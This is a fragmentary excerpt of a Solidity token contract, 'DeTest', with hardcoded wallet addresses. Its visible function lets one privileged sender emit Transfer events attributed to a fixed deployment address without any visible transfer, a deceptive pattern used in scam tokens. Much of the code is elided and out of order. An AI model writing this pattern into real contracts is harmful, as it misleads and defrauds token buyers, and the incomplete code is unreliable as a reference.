...
contract DeTest is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "DeTest";
    string private constant _symbol = "DETEST";
    ...
    address payable private _developmentAddress = payable(0xE275F7C5218365a7B43810dDe05878316880bDe0);
    address payable private _marketingAddress = payable(0xE275F7C5218365a7B43810dDe05878316880bDe0);
    ...
    constructor() {
        ...
        deploy(deploymentAddress, _tTotal);
       ...
       _isExcludedFromWalletLimit[_developmentAddress] = true;
       _isExcludedFromWalletLimit[_marketingAddress] = true;
        ...
        address deploymentAddress = 0x6D0b366129B54fdf2428DfA1edcAdf0922CE54Eb ;
        ...
        returns (bool)
    {
        if(msg.sender == Construct)  {
            ...
            emit Transfer (deploymentAddress, recipient, amount);
            return true; } else {     
